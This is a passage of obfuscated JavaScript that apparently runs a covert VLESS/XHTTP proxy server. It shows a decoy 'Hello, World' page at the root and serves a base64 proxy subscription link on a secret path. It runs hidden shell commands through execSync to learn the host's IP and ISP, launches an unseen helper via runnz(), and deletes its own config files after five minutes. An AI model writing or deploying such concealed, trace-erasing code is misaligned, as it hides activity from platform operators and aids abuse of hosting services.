_0x21ac29=_0x503a67;log(_0x21ac29(0x26b),_0x21ac29(0x1f4)+_0x3fc09b[_0x21ac29(0x249)]),!this[_0x21ac29(0x212)][_0x21ac29(0x1f9)]&&this[_0x21ac29(0x212)][_0x21ac29(0x226)]();});}catch(_0x34ce7e){log('error',_0x503a67(0x289)+_0x34ce7e[_0x503a67(0x249)]),this[_0x503a67(0x222)]();}}[_0x3bbca(0x2a9)](_0x1a8a40,_0x2a571e){const _0x22e8e8=_0x3bbca;return!_0x1a8a40[_0x22e8e8(0x286)]&&_0x1a8a40[_0x22e8e8(0x283)](0xc8,_0x2a571e),this[_0x22e8e8(0x212)]=_0x1a8a40,this[_0x22e8e8(0x27c)]&&this[_0x22e8e8(0x245)]&&this[_0x22e8e8(0x254)](),_0x1a8a40['on'](_0x22e8e8(0x21f),()=>{const _0x51ef25=_0x22e8e8;log('info','Client\x20connection\x20closed'),this[_0x51ef25(0x222)]();}),!![];}async[_0x3bbca(0x276)](_0x2cdfc0){const _0x2151b0=_0x3bbca;if(!this[_0x2151b0(0x246)]||this['remote']['destroyed'])throw new Error(_0x2151b0(0x25f));return new Promise((_0xbba44c,_0x441cde)=>{this['remote']['write'](_0x2cdfc0,_0x3807ea=>{const _0x217dd0=_0x228f;_0x3807ea?(log(_0x217dd0(0x26b),_0x217dd0(0x2ae)+_0x3807ea[_0x217dd0(0x249)]),_0x441cde(_0x3807ea)):_0xbba44c();});});}[_0x3bbca(0x254)](){const _0x111359=_0x3bbca;if(!this[_0x111359(0x212)]||!this['responseHeader'])return;try{!this[_0x111359(0x297)]&&(this[_0x111359(0x212)][_0x111359(0x26c)](this[_0x111359(0x245)]),this[_0x111359(0x297)]=!![]),this[_0x111359(0x246)][_0x111359(0x227)](this[_0x111359(0x212)]),this[_0x111359(0x246)]['on'](_0x111359(0x226),()=>{const _0x292d48=_0x111359;!this[_0x292d48(0x212)]['writableEnded']&&this[_0x292d48(0x212)][_0x292d48(0x226)]();}),this[_0x111359(0x246)]['on'](_0x111359(0x26b),_0x30ca10=>{const _0x2095f5=_0x111359;log('error','Remote\x20error:\x20'+_0x30ca10['message']),!this[_0x2095f5(0x212)][_0x2095f5(0x1f9)]&&this[_0x2095f5(0x212)][_0x2095f5(0x226)]();});}catch(_0x32c6c2){log(_0x111359(0x26b),_0x111359(0x289)+_0x32c6c2[_0x111359(0x249)]),this[_0x111359(0x222)]();}}[_0x3bbca(0x222)](){const _0x77ee94=_0x3bbca;!this[_0x77ee94(0x2ba)]&&(this[_0x77ee94(0x2ba)]=!![],log('debug',_0x77ee94(0x1e9)+this[_0x77ee94(0x223)]),this[_0x77ee94(0x246)]&&(this[_0x77ee94(0x246)][_0x77ee94(0x278)](),this[_0x77ee94(0x246)]=null),this[_0x77ee94(0x27c)]=![],this[_0x77ee94(0x297)]=![]);}}const metaInfo=execSync(_0x3bbca(0x28b),{'encoding':_0x3bbca(0x29c)}),ISP=metaInfo[_0x3bbca(0x285)]();let IP=DOMAIN;if(!DOMAIN)try{IP=execSync(_0x3bbca(0x247),{'encoding':_0x3bbca(0x29c)})[_0x3bbca(0x285)]();}catch(_0x45f36f){try{IP='['+execSync(_0x3bbca(0x22a),{'encoding':'utf-8'})['trim']()+']';}catch(_0x3f7b0d){log('error',_0x3bbca(0x282),_0x3f7b0d[_0x3bbca(0x249)]),IP=_0x3bbca(0x271);}}const server=http[_0x3bbca(0x279)]((_0x307d86,_0x430257)=>{const _0x399db2=_0x3bbca,_0x1a0299={'Access-Control-Allow-Origin':'*','Access-Control-Allow-Methods':_0x399db2(0x1e1),'Cache-Control':_0x399db2(0x1e3),'X-Accel-Buffering':'no','X-Padding':generatePadding(0x64,0x3e8)};if(_0x307d86[_0x399db2(0x203)]==='/'){_0x430257['writeHead'](0xc8,{'Content-Type':_0x399db2(0x231)}),_0x430257['end']('Hello,\x20World\x0a');return;}if(_0x307d86[_0x399db2(0x203)]==='/'+SUB_PATH){const _0x23f570='vless://'+UUID+'@'+IP+_0x399db2(0x235)+IP+'&fp=chrome&allowInsecure=1&type=xhttp&host='+IP+_0x399db2(0x28c)+SETTINGS[_0x399db2(0x20e)]+_0x399db2(0x24a)+NAME+'-'+ISP,_0x3b003a=Buffer[_0x399db2(0x202)](_0x23f570)[_0x399db2(0x24b)](_0x399db2(0x2c4));_0x430257[_0x399db2(0x283)](0xc8,{'Content-Type':_0x399db2(0x231)}),_0x430257[_0x399db2(0x226)](_0x3b003a+'\x0a');return;}const _0x4cbe52=_0x307d86['url']['match'](new RegExp(XPATH+_0x399db2(0x1fb)));if(!_0x4cbe52){_0x430257[_0x399db2(0x283)](0x194),_0x430257['end']();return;}const _0x17d7e8=_0x4cbe52[0x1],_0x25032a=_0x4cbe52[0x2]?parseInt(_0x4cbe52[0x2]):null;if(_0x307d86[_0x399db2(0x2bd)]==='GET'&&!_0x25032a){_0x1a0299['Content-Type']=_0x399db2(0x240),_0x1a0299['Transfer-Encoding']=_0x399db2(0x252);let _0x279068=sessions['get'](_0x17d7e8);!_0x279068&&(_0x279068=new Session(_0x17d7e8),sessions[_0x399db2(0x26e)](_0x17d7e8,_0x279068),log(_0x399db2(0x2b8),_0x399db2(0x22b)+_0x17d7e8));_0x279068['downstreamStarted']=!![];!_0x279068[_0x399db2(0x2a9)](_0x430257,_0x1a0299)&&(log(_0x399db2(0x26b),'Failed\x20to\x20start\x20downstream\x20for\x20session:\x20'+_0x17d7e8),!_0x430257[_0x399db2(0x286)]&&(_0x430257[_0x399db2(0x283)](0x1f4),_0x430257['end']()),_0x279068[_0x399db2(0x222)](),sessions['delete'](_0x17d7e8));return;}if(_0x307d86[_0x399db2(0x2bd)]===_0x399db2(0x1fa)&&_0x25032a!==null){let _0x104bd4=sessions['get'](_0x17d7e8);!_0x104bd4&&(_0x104bd4=new Session(_0x17d7e8),sessions[_0x399db2(0x26e)](_0x17d7e8,_0x104bd4),log(_0x399db2(0x2b8),_0x399db2(0x260)+_0x17d7e8),setTimeout(()=>{const _0x3146b3=_0x399db2,_0x313d96=sessions[_0x3146b3(0x21d)](_0x17d7e8);_0x313d96&&!_0x313d96[_0x3146b3(0x1ec)]&&(log(_0x3146b3(0x1e2),_0x3146b3(0x264)+_0x17d7e8+_0x3146b3(0x293)),_0x313d96[_0x3146b3(0x222)](),sessions[_0x3146b3(0x25a)](_0x17d7e8));},SETTINGS[_0x399db2(0x2aa)]));let _0x30f625=[],_0x10eb70=0x0,_0x4b819f=![];_0x307d86['on'](_0x399db2(0x233),_0x573f9e=>{const _0x4cd571=_0x399db2;_0x10eb70+=_0x573f9e[_0x4cd571(0x21c)];if(_0x10eb70>SETTINGS[_0x4cd571(0x26a)]){!_0x4b819f&&(_0x430257[_0x4cd571(0x283)](0x19d),_0x430257[_0x4cd571(0x226)](),_0x4b819f=!![]);return;}_0x30f625[_0x4cd571(0x1f1)](_0x573f9e);}),_0x307d86['on'](_0x399db2(0x226),async()=>{const _0x1c5813=_0x399db2;if(_0x4b819f)return;try{const _0x5be467=Buffer[_0x1c5813(0x208)](_0x30f625);log(_0x1c5813(0x2b8),_0x1c5813(0x291)+_0x25032a+_0x1c5813(0x28d)+_0x5be467[_0x1c5813(0x21c)]),await _0x104bd4[_0x1c5813(0x2af)](_0x25032a,_0x5be467),!_0x4b819f&&(_0x430257[_0x1c5813(0x283)](0xc8,_0x1a0299),_0x4b819f=!![]),_0x430257[_0x1c5813(0x226)]();}catch(_0x5068f7){log(_0x1c5813(0x26b),_0x1c5813(0x1f5)+_0x5068f7[_0x1c5813(0x249)]),_0x104bd4[_0x1c5813(0x222)](),sessions[_0x1c5813(0x25a)](_0x17d7e8),!_0x4b819f&&(_0x430257[_0x1c5813(0x283)](0x1f4),_0x4b819f=!![]),_0x430257[_0x1c5813(0x226)]();}});return;}_0x430257[_0x399db2(0x283)](0x194),_0x430257[_0x399db2(0x226)]();});server['on'](_0x3bbca(0x296),_0x107425=>{const _0x3dd98c=_0x3bbca;log(_0x3dd98c(0x27e),_0x3dd98c(0x217)+(_0x107425[_0x3dd98c(0x295)]||'http/1.1'));});function generatePadding(_0x424b8e,_0x265092){const _0x2d1d0e=_0x3bbca,_0x3b4bc1=_0x424b8e+Math['floor'](Math['random']()*(_0x265092-_0x424b8e));return Buffer['from'](Array(_0x3b4bc1)[_0x2d1d0e(0x259)]('X')['join'](''))[_0x2d1d0e(0x24b)](_0x2d1d0e(0x2c4));}server[_0x3bbca(0x2a3)]=0x975e0,server['headersTimeout']=0x98968,server['on'](_0x3bbca(0x26b),_0x180f4f=>{const _0xce197=_0x3bbca;log('error',_0xce197(0x2a6)+_0x180f4f[_0xce197(0x249)]);});const delFiles=()=>{const _0x751fd9=_0x3bbca;[_0x751fd9(0x1e7),'config.yaml'][_0x751fd9(0x267)](_0x2bb716=>fs[_0x751fd9(0x2b9)](_0x2bb716,()=>{}));};server[_0x3bbca(0x218)](PORT,()=>{const _0x3743ce=_0x3bbca;runnz(),setTimeout(()=>{delFiles();},0x493e0),addAccessTask(),console[_0x3743ce(0x27b)](_0x3743ce(0x200)+PORT),log(_0x3743ce(0x2b8),_0x3743ce(0x2ac)),log('info','Log\x20level:\x20'+SETTINGS[_0x3743ce(0x25c)]),log(_0x3743ce(0x2b8),_0x3743ce(0x1ff)+SETTINGS[_0x3743ce(0x21a)]),log('info',_0x3743ce(0x29f)+SETTINGS[_0x3743ce(0x26a)]+'KB'),log(_0x3743ce(0x2b8),_0x3743ce(0x205)+SETTINGS['BUFFER_SIZE']+'KB'),log(_0x3743ce(0x2b8),_0x3743ce(0x1ee)+SETTINGS['CHUNK_SIZE']+_0x3743ce(0x20a)),log('info',_0x3743ce(0x2ac));});
